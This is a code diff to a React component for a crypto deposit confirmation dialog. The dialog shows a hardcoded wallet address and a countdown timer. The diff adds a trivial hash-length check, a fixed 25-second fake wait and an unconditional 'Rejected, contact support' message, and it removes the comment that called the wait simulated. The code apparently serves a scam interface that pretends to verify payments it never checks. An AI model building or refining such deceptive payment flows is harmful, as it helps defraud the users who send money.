@@ -4,6 +4,7 @@ import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { CountdownTimer } from "@/components/CountdownTimer";
 import { Loader2 } from "lucide-react";
+import { useToast } from "@/hooks/use-toast";
 
 interface DepositConfirmationDialogProps {
   isOpen: boolean;
@@ -20,16 +21,38 @@ const DepositConfirmationDialog = ({
 }: DepositConfirmationDialogProps) => {
   const [transactionHash, setTransactionHash] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const { toast } = useToast();
   const walletAddress = "0xc68c825191546453e36aaa005ebf10b5219ce175";
   
-  // Calculate end time (30 minutes from now)
   const endTime = new Date(new Date().getTime() + 30 * 60000).toISOString();
 
+  const validateHash = (hash: string) => {
+    if (hash.length < 10) {
+      toast({
+        variant: "destructive",
+        title: "Ошибка",
+        description: "Неправильный hash, проверьте введенные данные"
+      });
+      return false;
+    }
+    return true;
+  };
+
   const handleSubmit = async () => {
+    if (!validateHash(transactionHash)) {
+      return;
+    }
+
     setIsSubmitting(true);
-    // Simulate loading for 25 seconds
     await new Promise(resolve => setTimeout(resolve, 25000));
     setIsSubmitting(false);
+    
+    toast({
+      variant: "destructive",
+      title: "Отклонено",
+      description: "Свяжитесь с поддержкой"
+    });
+    
     onConfirm(transactionHash);
   };
 
